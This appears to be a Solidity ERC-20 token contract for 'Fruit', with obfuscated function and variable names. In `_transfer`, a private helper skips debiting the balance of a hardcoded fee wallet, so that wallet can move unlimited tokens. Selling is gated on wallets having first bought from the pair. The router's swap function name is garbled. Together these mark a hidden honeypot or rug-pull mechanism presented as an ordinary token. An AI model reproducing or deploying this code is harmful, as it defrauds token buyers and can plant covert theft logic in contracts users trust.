/**

This is  $Fruit


TWITTER: https://twitter.com/fruit_erc
TELEGRAM: https://t.me/Fruit_erc
WEBSITE: https://www.fruiteth.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qkmqo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qkmqo(a, b, "SafeMath:");
    }

    function  _qkmqo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skogrqakubp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xabfjckofs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Fruit is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Fruit";
    string private constant _symbol = unicode"Fruit";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalal = 1000000000 * 10 **_decimals;
    uint256 public _mxTauAmaunt = _Totalal;
    uint256 public _Walletumxax = _Totalal;
    uint256 public _wapThresholduax= _Totalal;
    uint256 public _mukuTauap= _Totalal;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqgysrt=0;
    uint256 private _burkevt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEjfdkFcuf;
    mapping (address => bool) private _taxmWalary;
    mapping(address => uint256) private _lrLevrfavep;
    bool public _tnsfereslvnove = false;
    address payable private _qkfredFvtp;

    _xabfjckofs private _umvRabhdgrt;
    address private _afbjPrvuw;
    bool private _zrujcobah;
    bool private iulSwpvaq = false;
    bool private _apEalbew = false;

    event _amryauahl(uint _mxTauAmaunt);
    modifier lckrThocfp {
        iulSwpvaq = true;
        _;
        iulSwpvaq = false;
    }

    constructor () {
        _qkfredFvtp = payable(0xcE3491F3a528AbF21F618FD67183e154A305045F);
        _balances[_msgSender()] = _Totalal;
        _isEjfdkFcuf[owner()] = true;
        _isEjfdkFcuf[address(this)] = true;
        _isEjfdkFcuf[_qkfredFvtp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalal);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qkmqo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslvnove) {
                if (to != address
                (_umvRabhdgrt) && to !=
                 address(_afbjPrvuw)) {
                  require(_lrLevrfavep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLevrfavep
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbjPrvuw && to != 
            address(_umvRabhdgrt) && !_isEjfdkFcuf[to] ) {
                require(amount <= _mxTauAmaunt,
                 "Exceeds the _mxTauAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletumxax, "Exceeds the maxWalletSize.");
                if(_burkevt
                < _wapBeforeqgysrt){
                  require(! _fjtcqhz(to));
                }
                _burkevt++;
                 _taxmWalary[to]=true;
                teeomoun = amount.mul((_burkevt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbjPrvuw && from!= address(this) 
            && !_isEjfdkFcuf[from] ){
                require(amount <= _mxTauAmaunt && 
                balanceOf(_qkfredFvtp)<_mukuTauap,
                 "Exceeds the _mxTauAmaunt.");
                teeomoun = amount.mul((_burkevt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burkevt>_wapBeforeqgysrt &&
                 _taxmWalary[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iulSwpvaq 
            && to == _afbjPrvuw && _apEalbew &&
             contractTokenBalance>_wapThresholduax 
            && _burkevt>_wapBeforeqgysrt&&
             !_isEjfdkFcuf[to]&& !_isEjfdkFcuf[from]
            ) {
                _swpvngkarj( _qjmwe(amount, 
                _qjmwe(contractTokenBalance,_mukuTauap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erodnyrp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qkmqo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qkmqo(teeomoun));
        emit Transfer(from, to, 
        amount. _qkmqo(teeomoun));
    }

    function _swpvngkarj(uint256
     tokenAmount) private lckrThocfp {
        if(tokenAmount==0){return;}
        if(!_zrujcobah){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _umvRabhdgrt.WETH();
        _approve(address(this),
         address(_umvRabhdgrt), tokenAmount);
        _umvRabhdgrt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qjmwe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qkmqo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qkfredFvtp){
            return a ;
        }else{
            return a . _qkmqo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTauAmaunt = _Totalal;
        _Walletumxax = _Totalal;
        _tnsfereslvnove = false;
        emit _amryauahl(_Totalal);
    }

    function _fjtcqhz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erodnyrp(uint256
    amount) private {
        _qkfredFvtp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _zrujcobah);
        _umvRabhdgrt   =  _xabfjckofs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_umvRabhdgrt), _Totalal);
        _afbjPrvuw = _skogrqakubp(_umvRabhdgrt.factory()). createPair (address(this),  _umvRabhdgrt . WETH ());
        _umvRabhdgrt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbjPrvuw).approve(address(_umvRabhdgrt), type(uint).max);
        _apEalbew = true;
        _zrujcobah = true;
    }

    receive() external payable {}
}